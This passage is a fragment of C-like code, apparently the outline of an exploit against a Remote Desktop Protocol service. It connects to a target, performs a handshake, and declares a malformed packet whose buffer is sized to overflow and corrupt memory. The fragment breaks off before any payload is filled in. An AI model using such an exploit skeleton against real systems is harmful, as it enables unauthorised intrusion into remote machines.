    connect_to_target(sock, target, port);

    // 2. Session Negotiation (Standard RDP Handshake)
    send_rdp_handshake(sock);

    // 3. Malicious Packet Crafting (The Exploit Primitive)
    // This packet structure is tailored to trigger the specific memory corruption.
    struct MalformedRDPPacket {
        uint32_t length;
        uint16_t message_type;
        char payload_buffer[VULNERABLE_SIZE + OVERFLOW_AMOUNT]; // Buffer designed to overflow
    };

    MalformedRDPPacket exploit_packet;
    // Populate fields to trigger the memory corruption
